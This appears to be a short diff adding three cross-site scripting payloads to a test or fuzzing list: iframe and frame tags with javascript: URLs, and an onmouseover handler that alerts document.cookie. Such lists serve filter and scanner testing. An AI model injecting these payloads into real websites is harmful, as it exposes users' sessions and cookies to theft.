@@ -1,0 +1,3 @@
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
